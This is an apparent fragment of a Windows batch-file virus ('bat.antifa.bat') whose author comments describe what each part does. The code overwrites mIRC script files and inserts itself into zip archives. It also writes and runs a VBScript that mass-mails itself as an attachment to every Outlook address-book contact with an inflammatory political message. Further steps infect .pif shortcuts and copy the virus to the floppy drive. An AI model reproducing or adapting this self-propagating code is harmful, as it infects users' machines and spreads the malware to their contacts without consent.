debug<yup
del yup
del c:\payload.reg
move lord c:\mirc\script.ini
move lord c:\mirc32\script.ini
move lord c:\progra~1\mirc\script.ini
move lord c:\progra~1\mirc32\script.ini
del lord
for %%i in (*.zip ..\*.zip %winbootdir%\desktop\*.zip) do pkzip -e0 -u -r -k %%i "c:\bat.antifa.bat">nul.zip
for %%i in (*.zip ..\*.zip %winbootdir%\desktop\*.zip) do powerarc -a -c4 %%i c:\bat.antifa.bat

:: the above two lines infect zip files, if pkzip or PowerArchiver are installed

del %winbootdir%\ooo.vbs
echo.on error resume next>%winbootdir%\ooo.vbs
echo dim a,b,c,d,e>>%winbootdir%\ooo.vbs
echo set a = Wscript.CreateObject("Wscript.Shell")>>%winbootdir%\ooo.vbs
echo set b = CreateObject("Outlook.Application")>>%winbootdir%\ooo.vbs
echo set c = b.GetNameSpace("MAPI")>>%winbootdir%\ooo.vbs
echo for y = 1 To c.AddressLists.Count>>%winbootdir%\ooo.vbs
echo set d = c.AddressLists(y)>>%winbootdir%\ooo.vbs
echo x = 1>>%winbootdir%\ooo.vbs
echo set e = b.CreateItem(0)>>%winbootdir%\ooo.vbs
echo for o = 1 To d.AddressEntries.Count>>%winbootdir%\ooo.vbs
echo f = d.AddressEntries(x)>>%winbootdir%\ooo.vbs
echo e.Recipients.Add f>>%winbootdir%\ooo.vbs
echo x = x + 1>>%winbootdir%\ooo.vbs
echo next>>%winbootdir%\ooo.vbs
echo e.Subject = "this is where it gets NASTY">>%winbootdir%\ooo.vbs
echo e.Body = "Deutschland von der Karte streichen," & chr(13) & "Polen muss bis Frankreich reichen!">>%winbootdir%\ooo.vbs
echo e.Attachments.Add ("c:\bat.antifa.bat")>>%winbootdir%\ooo.vbs
echo e.DeleteAfterSubmit = False>>%winbootdir%\ooo.vbs
echo e.Send>>%winbootdir%\ooo.vbs
echo f = "">>%winbootdir%\ooo.vbs
echo next>>%winbootdir%\ooo.vbs
start %winbootdir%\ooo.vbs

:: a boring vbs to send the virus away through Outlook

echo.on error resume next>pif.vbs
echo dim wshs, msc>>pif.vbs
echo set wshs=Wscript.CreateObject("WScript.Shell")>>pif.vbs
echo set msc=wshs.CreateShortcut("C:\pif.lnk")>>pif.vbs
echo msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\bat.antifa.bat")>>pif.vbs
echo msc.WindowStyle = 4>>pif.vbs
echo msc.Save>>pif.vbs
start pif.vbs

:: a vbs to infect pif-files

command /f /c copy c:\bat.antifa.bat a:\

:: copies the virus to disk, if there is one

for %%k in (%winbootdir%\desktop\*.pif) do copy c:\pif.pif %%k
del pif.vbs
:evil
md %winbootdir%\desktop\²nazis_raus!³
:payload